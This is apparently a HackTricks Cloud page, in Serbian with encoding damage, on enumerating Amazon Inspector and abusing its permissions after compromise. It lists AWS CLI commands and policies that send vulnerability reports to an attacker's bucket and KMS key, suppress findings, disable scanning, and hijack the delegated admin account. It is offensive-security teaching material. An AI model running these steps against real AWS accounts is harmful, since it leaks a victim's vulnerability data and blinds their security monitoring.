# AWS - Inspector Enum

## AWS - Inspector Enum

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

### Inspector

Amazon Inspector je napredna, automatizovana usluga za upravljanje ranjivostima koja je dizajnirana da poboljÅ¡a bezbednost vaÅ¡eg AWS okruÅ¾enja. Ova usluga kontinuirano skenira Amazon EC2 instance, slike kontejnera u Amazon ECR, Amazon ECS i AWS Lambda funkcije za ranjivosti i neÅ¾eljeno izlaganje mreÅ¾i. KoriÅ¡Ä‡enjem robusne baze podataka o ranjivostima, Amazon Inspector pruÅ¾a detaljna otkriÄ‡a, ukljuÄujuÄ‡i nivoe ozbiljnosti i preporuke za otklanjanje, pomaÅ¾uÄ‡i organizacijama da proaktivno identifikuju i reÅ¡e bezbednosne rizike. Ovaj sveobuhvatan pristup osigurava ojaÄanu bezbednosnu poziciju Å¡irom razliÄitih AWS usluga, pomaÅ¾uÄ‡i u usklaÄ‘enosti i upravljanju rizicima.

### Key elements

#### Findings

OtkriÄ‡a u Amazon Inspector su detaljni izveÅ¡taji o ranjivostima i izloÅ¾enostima otkrivenim tokom skeniranja EC2 instanci, ECR repozitorijuma ili Lambda funkcija. Na osnovu svog stanja, otkriÄ‡a se kategorizuju kao:

* **Aktivno**: OtkriÄ‡e nije otklonjeno.
* **Zatvoreno**: OtkriÄ‡e je otklonjeno.
* **Potisnuto**: OtkriÄ‡e je oznaÄeno ovim stanjem zbog jednog ili viÅ¡e **pravila potiskivanja**.

OtkriÄ‡a su takoÄ‘e kategorizovana u sledeÄ‡e tri vrste:

* **Paket**: Ova otkriÄ‡a se odnose na ranjivosti u softverskim paketima instaliranim na vaÅ¡im resursima. Primeri ukljuÄuju zastarele biblioteke ili zavisnosti sa poznatim bezbednosnim problemima.
* **Kod**: Ova kategorija ukljuÄuje ranjivosti pronaÄ‘ene u kodu aplikacija koje rade na vaÅ¡im AWS resursima. UobiÄajeni problemi su greÅ¡ke u kodiranju ili nesigurne prakse koje mogu dovesti do bezbednosnih propusta.
* **MreÅ¾a**: MreÅ¾na otkriÄ‡a identifikuju potencijalne izloÅ¾enosti u mreÅ¾nim konfiguracijama koje bi napadaÄi mogli iskoristiti. Ovo ukljuÄuje otvorene portove, nesigurne mreÅ¾ne protokole i pogreÅ¡no konfigurisane sigurnosne grupe.

#### Filters and Suppression Rules

Filteri i pravila potiskivanja u Amazon Inspector pomaÅ¾u u upravljanju i prioritetizaciji otkriÄ‡a. Filteri vam omoguÄ‡avaju da precizirate otkriÄ‡a na osnovu specifiÄnih kriterijuma, kao Å¡to su ozbiljnost ili tip resursa. Pravila potiskivanja omoguÄ‡avaju vam da potisnete odreÄ‘ena otkriÄ‡a koja se smatraju niskim rizikom, koja su veÄ‡ ublaÅ¾ena, ili iz bilo kog drugog vaÅ¾nog razloga, spreÄavajuÄ‡i ih da preopterete vaÅ¡e bezbednosne izveÅ¡taje i omoguÄ‡avajuÄ‡i vam da se fokusirate na kritiÄnije probleme.

#### Software Bill of Materials (SBOM)

Software Bill of Materials (SBOM) u Amazon Inspector je izvoziva ugnjeÅ¾dena lista inventara koja detaljno opisuje sve komponente unutar softverskog paketa, ukljuÄujuÄ‡i biblioteke i zavisnosti. SBOM-ovi pomaÅ¾u u pruÅ¾anju transparentnosti u lancu snabdevanja softverom, omoguÄ‡avajuÄ‡i bolje upravljanje ranjivostima i usklaÄ‘enost. Oni su kljuÄni za identifikaciju i ublaÅ¾avanje rizika povezanih sa open source i komponentama treÄ‡ih strana.

### Key features

#### Export findings

Amazon Inspector nudi moguÄ‡nost izvoza otkriÄ‡a u Amazon S3 Buckets, Amazon EventBridge i AWS Security Hub, Å¡to vam omoguÄ‡ava da generiÅ¡ete detaljne izveÅ¡taje o identifikovanim ranjivostima i izloÅ¾enostima za dalju analizu ili deljenje na odreÄ‘eni datum i vreme. Ova funkcija podrÅ¾ava razliÄite formate izlaza kao Å¡to su CSV i JSON, olakÅ¡avajuÄ‡i integraciju sa drugim alatima i sistemima. Funkcionalnost izvoza omoguÄ‡ava prilagoÄ‘avanje podataka ukljuÄenih u izveÅ¡taje, omoguÄ‡avajuÄ‡i vam da filtrirate otkriÄ‡a na osnovu specifiÄnih kriterijuma kao Å¡to su ozbiljnost, tip resursa ili vremenski opseg i ukljuÄujuÄ‡i po defaultu sva vaÅ¡a otkriÄ‡a u trenutnoj AWS regiji sa aktivnim statusom.

Kada izvozite otkriÄ‡a, potrebna je kljuÄna usluga za upravljanje kljuÄevima (KMS) za enkripciju podataka tokom izvoza. KMS kljuÄevi osiguravaju da su izvezena otkriÄ‡a zaÅ¡tiÄ‡ena od neovlaÅ¡Ä‡enog pristupa, pruÅ¾ajuÄ‡i dodatni sloj bezbednosti za osetljive informacije o ranjivostima.

#### Amazon EC2 instances scanning

Amazon Inspector nudi robusne moguÄ‡nosti skeniranja za Amazon EC2 instance kako bi otkrio ranjivosti i bezbednosne probleme. Inspector uporeÄ‘uje izvuÄene metapodatke iz EC2 instance sa pravilima iz bezbednosnih saveta kako bi proizveo ranjivosti paketa i probleme sa dostupnoÅ¡Ä‡u mreÅ¾e. Ova skeniranja se mogu izvesti putem **agent-based** ili **agentless** metoda, u zavisnosti od konfiguracije **scan mode** postavki vaÅ¡eg naloga.

* **Agent-Based**: Koristi AWS Systems Manager (SSM) agenta za izvoÄ‘enje dubokih skeniranja. Ova metoda omoguÄ‡ava sveobuhvatno prikupljanje i analizu podataka direktno sa instance.
* **Agentless**: PruÅ¾a laganu alternativu koja ne zahteva instalaciju agenta na instanci, kreirajuÄ‡i EBS snimak svake particije EC2 instance, traÅ¾eÄ‡i ranjivosti, a zatim ga briÅ¡uÄ‡i; koristeÄ‡i postojeÄ‡u AWS infrastrukturu za skeniranje.

NaÄin skeniranja odreÄ‘uje koja metoda Ä‡e se koristiti za izvoÄ‘enje EC2 skeniranja:

* **Agent-Based**: UkljuÄuje instalaciju SSM agenta na EC2 instancama za duboku inspekciju.
* **Hybrid Scanning**: Kombinuje agent-based i agentless metode kako bi maksimizirao pokrivenost i minimizirao uticaj na performanse. Na onim EC2 instancama gde je instaliran SSM agent, Inspector Ä‡e izvesti agent-based skeniranje, a za one gde nema SSM agenta, skeniranje Ä‡e biti agentless.

JoÅ¡ jedna vaÅ¾na funkcija je **duboka inspekcija** za EC2 Linux instance. Ova funkcija nudi temeljnu analizu softvera i konfiguracije EC2 Linux instanci, pruÅ¾ajuÄ‡i detaljne procene ranjivosti, ukljuÄujuÄ‡i ranjivosti operativnog sistema, ranjivosti aplikacija i pogreÅ¡ne konfiguracije, osiguravajuÄ‡i sveobuhvatnu bezbednosnu evaluaciju. Ovo se postiÅ¾e inspekcijom **prilagoÄ‘enih putanja** i svih njihovih poddirektorijuma. Po defaultu, Amazon Inspector Ä‡e skenirati sledeÄ‡e, ali svaki Älan naloga moÅ¾e definisati do 5 dodatnih prilagoÄ‘enih putanja, a svaki delegirani administrator do 10:

* `/usr/lib`
* `/usr/lib64`
* `/usr/local/lib`
* `/usr/local/lib64`

#### Amazon ECR container images scanning

Amazon Inspector pruÅ¾a robusne moguÄ‡nosti skeniranja za Amazon Elastic Container Registry (ECR) slike kontejnera, osiguravajuÄ‡i da se ranjivosti paketa otkriju i efikasno upravljaju.

* **Basic Scanning**: Ovo je brzo i lagano skeniranje koje identifikuje poznate ranjivosti OS paketa u slikama kontejnera koristeÄ‡i standardni set pravila iz open-source Clair projekta. Sa ovom konfiguracijom skeniranja, vaÅ¡i repozitorijumi Ä‡e biti skenirani prilikom push-a, ili izvoÄ‘enjem ruÄnih skeniranja.
* **Enhanced Scanning**: Ova opcija dodaje funkciju kontinuiranog skeniranja pored skeniranja prilikom push-a. Enhanced skeniranje dublje analizira slojeve svake slike kontejnera kako bi identifikovalo ranjivosti u OS paketima i paketima programskih jezika sa veÄ‡om taÄnoÅ¡Ä‡u. Analizira i osnovnu sliku i sve dodatne slojeve, pruÅ¾ajuÄ‡i sveobuhvatan pregled potencijalnih bezbednosnih problema.

#### Amazon Lambda functions scanning

Amazon Inspector ukljuÄuje sveobuhvatne moguÄ‡nosti skeniranja za AWS Lambda funkcije i njene slojeve, osiguravajuÄ‡i bezbednost i integritet serverless aplikacija. Inspector nudi dve vrste skeniranja za Lambda funkcije:

* **Lambda standard scanning**: Ova podrazumevana funkcija identifikuje softverske ranjivosti u zavisnostima paketa aplikacije dodatim vaÅ¡oj Lambda funkciji i slojevima. Na primer, ako vaÅ¡a funkcija koristi verziju biblioteke kao Å¡to je python-jwt sa poznatom ranjivoÅ¡Ä‡u, generiÅ¡e otkriÄ‡e.
* **Lambda code scanning**: Analizira prilagoÄ‘eni kod aplikacije radi bezbednosnih problema, otkrivajuÄ‡i ranjivosti kao Å¡to su greÅ¡ke u injekciji, curenje podataka, slaba kriptografija i nedostatak enkripcije. Zapisuje delove koda koji istiÄu otkrivene ranjivosti, kao Å¡to su hardkodovane akreditive. OtkriÄ‡a ukljuÄuju detaljne preporuke za otklanjanje i delove koda za ispravljanje problema.

#### **Center for Internet Security (CIS) scans**

Amazon Inspector ukljuÄuje CIS skeniranja kako bi uporedio operativne sisteme Amazon EC2 instanci sa preporukama najboljih praksi iz Centra za internet bezbednost (CIS). Ova skeniranja osiguravaju da konfiguracije budu u skladu sa industrijskim standardima bezbednosnih osnova.

* **Konfiguracija**: CIS skeniranja procenjuju da li sistemske konfiguracije ispunjavaju specifiÄne CIS Benchmark preporuke, pri Äemu je svaka provera povezana sa CIS ID-om provere i naslovom.
* **IzvrÅ¡enje**: Skeniranja se izvode ili zakazuju na osnovu oznaka instanci i definisanih rasporeda.
* **Rezultati**: Rezultati nakon skeniranja ukazuju koje su provere proÅ¡le, preskoÄene ili pale, pruÅ¾ajuÄ‡i uvid u bezbednosnu poziciju svake instance.

### Enumeration
```bash
# Administrator and member accounts #

## Retrieve information about the AWS Inpsector delegated administrator for your organization (ReadOnlyAccess policy is enough for this)
aws inspector2 get-delegated-admin-account

## List the members who are associated with the AWS Inspector administrator account (ReadOnlyAccess policy is enough for this)
aws inspector2 list-members [--only-associated | --no-only-associated]
## Retrieve information about a member account (ReadOnlyAccess policy is enough for this)
aws inspector2 get-member --account-id <value>
## Retrieve the status of AWS accounts within your environment (ReadOnlyAccess policy is enough for this)
aws inspector2 batch-get-account-status [--account-ids <value>]
## Retrieve the free trial status for the specified accounts (ReadOnlyAccess policy is enough for this)
aws inspector2 batch-get-free-trial-info --account-ids <value>
## Retrieve the EC2 Deep Inspection status for the member accounts (Requires to be the delegated administrator)
aws inspector2 batch-get-member-ec2-deep-inspection-status [--account-ids <value>]

## List an account's permissions associated with AWS Inspector
aws inspector2 list-account-permissions

# Findings #

## List a subset of information of the findings for your envionment (ReadOnlyAccess policy is enough for this)
aws inspector2 list-findings
## Retrieve vulnerability intelligence details for the specified findings
aws inspector2 batch-get-finding-details --finding-arns <value>
## List statistical and aggregated finding data (ReadOnlyAccess policy is enough for this)
aws inspector2 list-finding-aggregations --aggregation-type <FINDING_TYPE | PACKAGE | TITLE | REPOSITORY | AMI | AWS_EC2_INSTANCE | AWS_ECR_CONTAINER | IMAGE_LAYER\
| ACCOUNT AWS_LAMBDA_FUNCTION | LAMBDA_LAYER> [--account-ids <value>]
## Retrieve code snippet information about one or more specified code vulnerability findings
aws inspector2 batch-get-code-snippet --finding-arns <value>
## Retrieve the status for the specified findings report (ReadOnlyAccess policy is enough for this)
aws inspector2 get-findings-report-status --report-id <value>

# CIS #

## List CIS scan configurations (ReadOnlyAccess policy is enough for this)
aws inspector2 list-cis-scan-configurations
## List the completed CIS scans (ReadOnlyAccess policy is enough for this)
aws inspector2 list-cis-scans
## Retrieve a report from a completed CIS scan
aws inspector2 get-cis-scan-report --scan-arn <value> [--target-accounts <value>]
## Retrieve details about the specific CIS scan over the specified resource
aws inspector2 get-cis-scan-result-details --account-id <value> --scan-arn <value> --target-resource-id <value>
## List CIS scan results broken down by check
aws inspector2 list-cis-scan-results-aggregated-by-checks --scan-arn <value>
## List CIS scan results broken down by target resource
aws inspector2 list-cis-scan-results-aggregated-by-target-resource --scan-arn <value>

# Configuration #

## Describe AWS Inspector settings for AWS Organization (ReadOnlyAccess policy is enough for this)
aws inspector2 describe-organization-configuration
## Retrieve the configuration settings about EC2 scan and ECR re-scan
aws inspector2 get-configuration
## Retrieve EC2 Deep Inspection configuration associated with your account
aws inspector2 get-ec2-deep-inspection-configuration

# Miscellaneous #

## Retrieve the details of a Software Bill of Materials (SBOM) report
aws inspector2 get-sbom-export --report-id <value>

## Retrieve the coverage details for the specified vulnerabilities
aws inspector2 search-vulnerabilities --filter-criteria <vulnerabilityIds=id1,id2..>

## Retrieve the tags attached to the specified resource
aws inspector2 list-tags-for-resource --resource-arn <value>

## Retrieve the AWS KMS key used to encrypt the specified code snippets
aws inspector2 get-encryption-key --resource-type <AWS_EC2_INSTANCE | AWS_ECR_CONTAINER_IMAGE | AWS_ECR_REPOSITORY | AWS_LAMBDA_FUNCTION> --scan-type <NETWORK | PACKAGE | CODE>

## List the filters associated to your AWS account
aws inspector2 list-filters

## List the types of statistics AWS Inspector can generate (ReadOnlyAccess policy is enough for this)
aws inspector2 list-coverage
## Retrieve statistical data and about the resources AWS Inspector monitors (ReadOnlyAccess policy is enough for this)
aws inspector2 list-coverage-statistics

## List the aggregated usage total over the last 30 days
aws inspector2 list-usage-totals [--account-ids <value>]

### INSPECTOR CLASSIC ###

## Assessments info, there is a "describe" action for each one to get more info
aws inspector list-assessment-runs
aws inspector list-assessment-targets
aws inspector list-assessment-templates
aws inspector list-event-subscriptions

## Get findings
aws inspector list-findings

## Get exclusions
aws inspector list-exclusions --assessment-run-arn <arn>

## Rule packages
aws inspector list-rules-packages
```
### Post Exploatacija

{% hint style="success" %}
Iz perspektive napadaÄa, ova usluga moÅ¾e pomoÄ‡i napadaÄu da pronaÄ‘e ranjivosti i mreÅ¾ne izloÅ¾enosti koje bi mu mogle pomoÄ‡i da kompromituje druge instance/kontejnere.

MeÄ‘utim, napadaÄ bi takoÄ‘e mogao biti zainteresovan za ometanje ove usluge kako bi Å¾rtva ne mogla da vidi ranjivosti (sve ili specifiÄne).
{% endhint %}

#### `inspector2:CreateFindingsReport`, `inspector2:CreateSBOMReport`

NapadaÄ bi mogao generisati detaljne izveÅ¡taje o ranjivostima ili softverskom raÄunu materijala (SBOM) i eksfiltrirati ih iz vaÅ¡eg AWS okruÅ¾enja. Ove informacije bi mogle biti iskoriÅ¡Ä‡ene za identifikaciju specifiÄnih slabosti, zastarelog softvera ili nesigurnih zavisnosti, omoguÄ‡avajuÄ‡i ciljanje napada.
```bash
# Findings report
aws inspector2 create-findings-report --report-format <CSV | JSON> --s3-destination <bucketName=string,keyPrefix=string,kmsKeyArn=string> [--filter-criteria <value>]
# SBOM report
aws inspector2 create-sbom-report --report-format <CYCLONEDX_1_4 | SPDX_2_3> --s3-destination <bucketName=string,keyPrefix=string,kmsKeyArn=string> [--resource-filter-criteria <value>]
```
Ğ¡Ğ»ĞµĞ´ĞµÑ›Ğ¸ Ğ¿Ñ€Ğ¸Ğ¼ĞµÑ€ Ğ¿Ğ¾ĞºĞ°Ğ·ÑƒÑ˜Ğµ ĞºĞ°ĞºĞ¾ Ğ´Ğ° ÑĞµ ĞµĞºÑÑ„Ğ¸Ğ»Ñ‚Ñ€Ğ¸Ñ€Ğ°Ñ˜Ñƒ ÑĞ²Ğµ Ğ°ĞºÑ‚Ğ¸Ğ²Ğ½Ğµ Ğ½Ğ°Ğ»Ğ°Ğ·Ğµ Ğ¸Ğ· Amazon Inspector-Ğ° Ñƒ Amazon S3 Bucket ĞºĞ¾Ñ˜Ğ¸ ĞºĞ¾Ğ½Ñ‚Ñ€Ğ¾Ğ»Ğ¸ÑˆĞµ Ğ½Ğ°Ğ¿Ğ°Ğ´Ğ°Ñ‡, ÑƒĞ· ĞºÑ™ÑƒÑ‡ Amazon KMS ĞºĞ¾Ñ˜Ğ¸ ĞºĞ¾Ğ½Ñ‚Ñ€Ğ¾Ğ»Ğ¸ÑˆĞµ Ğ½Ğ°Ğ¿Ğ°Ğ´Ğ°Ñ‡:

1. **ĞšÑ€ĞµĞ¸Ñ€Ğ°Ñ˜Ñ‚Ğµ Amazon S3 Bucket** Ğ¸ Ğ¿Ñ€Ğ¸ĞºÑ™ÑƒÑ‡Ğ¸Ñ‚Ğµ Ğ¿Ğ¾Ğ»Ğ¸Ñ‚Ğ¸ĞºÑƒ Ğ½Ğ° ÑšĞµĞ³Ğ° ĞºĞ°ĞºĞ¾ Ğ±Ğ¸ Ğ±Ğ¸Ğ¾ Ğ´Ğ¾ÑÑ‚ÑƒĞ¿Ğ°Ğ½ Ğ¸Ğ· Ğ¶Ñ€Ñ‚Ğ²Ğ¾Ğ²Ğ°Ğ½Ğ¾Ğ³ Amazon Inspector-Ğ°:
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Sid": "allow-inspector",
"Effect": "Allow",
"Principal": {
"Service": "inspector2.amazonaws.com"
},
"Action": [
"s3:PutObject",
"s3:PutObjectAcl",
"s3:AbortMultipartUpload"
],
"Resource": "arn:aws:s3:::inspector-findings/*",
"Condition": {
"StringEquals": {
"aws:SourceAccount": "<victim-account-id>"
},
"ArnLike": {
"aws:SourceArn": "arn:aws:inspector2:us-east-1:<victim-account-id>:report/*"
}
}
}
]
}
```
2. **Kreirajte Amazon KMS kljuÄ** i prikaÄite politiku na njega kako bi mogao da se koristi od strane Å¾rtvinog Amazon Inspectora:
```json
{
"Version": "2012-10-17",
"Id": "key-policy",
"Statement": [
{
...
},
{
"Sid": "Allow victim Amazon Inspector to use the key",
"Effect": "Allow",
"Principal": {
"Service": "inspector2.amazonaws.com"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*",
"Condition": {
"StringEquals": {
"aws:SourceAccount": "<victim-account-id>"
}
}
}
]
}
```
3. IzvrÅ¡ite komandu za **kreiranje izveÅ¡taja o nalazima** eksfiltrirajuÄ‡i ga:
```bash
aws --region us-east-1 inspector2 create-findings-report --report-format CSV --s3-destination bucketName=<attacker-bucket-name>,keyPrefix=exfiltration_,kmsKeyArn=arn:aws:kms:us-east-1:123456789012:key/1a2b3c4d-1a2b-1a2b-1a2b-1a2b3c4d5e6f
```
* **Potencijalni Uticaj**: Generisanje i eksfiltracija detaljnih izveÅ¡taja o ranjivostima i softveru, sticanje uvida u specifiÄne ranjivosti i bezbednosne slabosti.

#### `inspector2:CancelFindingsReport`, `inspector2:CancelSbomExport`

NapadaÄ bi mogao da otkaÅ¾e generisanje navedenog izveÅ¡taja o nalazima ili SBOM izveÅ¡taja, spreÄavajuÄ‡i bezbednosne timove da dobiju pravovremene informacije o ranjivostima i softverskom raÄunu materijala (SBOM), odlaÅ¾uÄ‡i otkrivanje i otklanjanje bezbednosnih problema.
```bash
# Cancel findings report generation
aws inspector2 cancel-findings-report --report-id <value>
# Cancel SBOM report generatiom
aws inspector2 cancel-sbom-export --report-id <value>
```
* **Potencijalni Uticaj**: PoremeÄ‡aj u praÄ‡enju bezbednosti i spreÄavanje pravovremenog otkrivanja i otklanjanja bezbednosnih problema.

#### `inspector2:CreateFilter`, `inspector2:UpdateFilter`, `inspector2:DeleteFilter`

NapadaÄ sa ovim dozvolama mogao bi da manipuliÅ¡e pravilima filtriranja koja odreÄ‘uju koje ranjivosti i bezbednosni problemi se prijavljuju ili potiskuju (ako je **akcija** postavljena na SUPPRESS, biÄ‡e kreirano pravilo za potiskivanje). Ovo bi moglo sakriti kritiÄne ranjivosti od bezbednosnih administratora, olakÅ¡avajuÄ‡i iskoriÅ¡Ä‡avanje ovih slabosti bez otkrivanja. Menjanjem ili uklanjanjem vaÅ¾nih filtera, napadaÄ bi takoÄ‘e mogao da stvori Å¡um preplavljujuÄ‡i sistem nevaÅ¾nim nalazima, ometajuÄ‡i efikasno praÄ‡enje i odgovor na bezbednosne incidente.
```bash
# Create
aws inspector2 create-filter --action <NONE | SUPPRESS> --filter-criteria <value> --name <value> [--reason <value>]
# Update
aws inspector2 update-filter --filter-arn <value> [--action <NONE | SUPPRESS>] [--filter-criteria <value>] [--reason <value>]
# Delete
aws inspector2 delete-filter --arn <value>
```
* **Potencijalni Uticaj**: Sakrivanje ili suzbijanje kritiÄnih ranjivosti, ili preplavljivanje sistema nevaÅ¾nim nalazima.

#### `inspector2:DisableDelegatedAdminAccount`, (`inspector2:EnableDelegatedAdminAccount` & `organizations:ListDelegatedAdministrators` & `organizations:EnableAWSServiceAccess` & `iam:CreateServiceLinkedRole`)

NapadaÄ bi mogao znaÄajno da ometa strukturu upravljanja bezbednoÅ¡Ä‡u.

* OnemoguÄ‡avanjem delegiranog administratorskog naloga, napadaÄ bi mogao spreÄiti bezbednosni tim da pristupi i upravlja podeÅ¡avanjima i izveÅ¡tajima Amazon Inspectora.
* OmoguÄ‡avanje neovlaÅ¡Ä‡enog administratorskog naloga omoguÄ‡ilo bi napadaÄu da kontroliÅ¡e bezbednosne konfiguracije, potencijalno onemoguÄ‡avajuÄ‡i skeniranja ili menjajuÄ‡i podeÅ¡avanja kako bi sakrio zlonamerne aktivnosti.

{% hint style="warning" %}
NeovlaÅ¡Ä‡eni nalog mora biti u istoj Organizaciji kao Å¾rtva da bi postao delegirani administrator.

Da bi neovlaÅ¡Ä‡eni nalog postao delegirani administrator, takoÄ‘e je potrebno da nakon Å¡to je legitimni delegirani administrator onemoguÄ‡en, i pre nego Å¡to se neovlaÅ¡Ä‡eni nalog omoguÄ‡i kao delegirani administrator, legitimni administrator mora biti deregistrovan kao delegirani administrator iz organizacije. Ovo se moÅ¾e uraditi sledeÄ‡om komandom (**`organizations:DeregisterDelegatedAdministrator`** dozvola potrebna): **`aws organizations deregister-delegated-administrator --account-id <legit-account-id> --service-principal [inspector2.amazonaws.com](http://inspector2.amazonaws.com/)`**
{% endhint %}
```bash
# Disable
aws inspector2 disable-delegated-admin-account --delegated-admin-account-id <value>
# Enable
aws inspector2 enable-delegated-admin-account --delegated-admin-account-id <value>
```
* **Potencijalni Uticaj**: PoremeÄ‡aj u upravljanju bezbednoÅ¡Ä‡u.

#### `inspector2:AssociateMember`, `inspector2:DisassociateMember`

NapadaÄ bi mogao da manipuliÅ¡e asocijacijom Älanova naloga unutar Amazon Inspector organizacije. Povezivanjem neovlaÅ¡Ä‡enih naloga ili odspajanjem legitimnih, napadaÄ bi mogao da kontroliÅ¡e koji nalozi su ukljuÄeni u bezbednosne skenove i izveÅ¡tavanje. To bi moglo dovesti do iskljuÄenja kritiÄnih naloga iz bezbednosnog nadzora, omoguÄ‡avajuÄ‡i napadaÄu da iskoristi ranjivosti u tim nalozima bez otkrivanja.

{% hint style="warning" %}
Ova akcija zahteva da je izvrÅ¡i delegirani administrator.
{% endhint %}
```bash
# Associate
aws inspector2 associate-member --account-id <value>
# Disassociate
aws inspector2 disassociate-member --account-id <value>
```
* **Potencijalni Uticaj**: IskljuÄenje kljuÄnih naloga iz bezbednosnih skeniranja, omoguÄ‡avajuÄ‡i neotkrivenu eksploataciju ranjivosti.

#### `inspector2:Disable`, (`inspector2:Enable` & `iam:CreateServiceLinkedRole`)

NapadaÄ sa dozvolom `inspector2:Disable` mogao bi da onemoguÄ‡i bezbednosna skeniranja na specifiÄnim tipovima resursa (EC2, ECR, Lambda, Lambda kod) za navedene naloge, ostavljajuÄ‡i delove AWS okruÅ¾enja neproverene i ranjive na napade. Pored toga, zahvaljujuÄ‡i dozvolama **`inspector2:Enable`** & **`iam:CreateServiceLinkedRole`**, napadaÄ bi mogao ponovo da omoguÄ‡i skeniranja selektivno kako bi izbegao otkrivanje sumnjivih konfiguracija.

{% hint style="warning" %}
Ova akcija zahteva da je izvrÅ¡i delegirani administrator.
{% endhint %}
```bash
# Disable
aws inspector2 disable --account-ids <value> [--resource-types <{EC2, ECR, LAMBDA, LAMBDA_CODE}>]
# Enable
aws inspector2 enable --resource-types <{EC2, ECR, LAMBDA, LAMBDA_CODE}> [--account-ids <value>]
```
* **Potencijalni Uticaj**: Kreiranje slepih taÄaka u bezbednosnom nadzoru.

#### `inspector2:UpdateOrganizationConfiguration`

NapadaÄ sa ovom dozvolom bi mogao da aÅ¾urira konfiguracije za vaÅ¡u Amazon Inspector organizaciju, utiÄuÄ‡i na podrazumevane funkcije skeniranja omoguÄ‡ene za nove Älanove naloga.

{% hint style="warning" %}
Ova akcija zahteva da je izvrÅ¡i delegirani administrator.
{% endhint %}
```bash
aws inspector2 update-organization-configuration --auto-enable <ec2=true|false,ecr=true|false,lambda=true|false,lambdaCode=true|false>
```
* **Potencijalni Uticaj**: Promeniti politike i konfiguracije bezbednosnog skeniranja za organizaciju.

#### `inspector2:TagResource`, `inspector2:UntagResource`

NapadaÄ bi mogao da manipuliÅ¡e oznakama na AWS Inspector resursima, koje su kljuÄne za organizovanje, praÄ‡enje i automatizaciju bezbednosnih procena. Promenom ili uklanjanjem oznaka, napadaÄ bi potencijalno mogao da sakrije ranjivosti od bezbednosnih skeniranja, ometa izveÅ¡tavanje o usklaÄ‘enosti i ometa procese automatske ispravke, Å¡to dovodi do nekontrolisanih bezbednosnih problema i kompromitovane integriteta sistema.
```bash
aws inspector2 tag-resource --resource-arn <value> --tags <value>
aws inspector2 untag-resource --resource-arn <value> --tag-keys <value>
```
* **Potencijalni uticaj**: Sakrivanje ranjivosti, prekid izveÅ¡tavanja o usklaÄ‘enosti, prekid automatizacije bezbednosti i prekid alokacije troÅ¡kova.

## Reference

* [https://docs.aws.amazon.com/inspector/latest/user/what-is-inspector.html](https://docs.aws.amazon.com/inspector/latest/user/what-is-inspector.html)
* [https://docs.aws.amazon.com/service-authorization/latest/reference/list\_amazoninspector2.html](https://docs.aws.amazon.com/service-authorization/latest/reference/list\_amazoninspector2.html)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
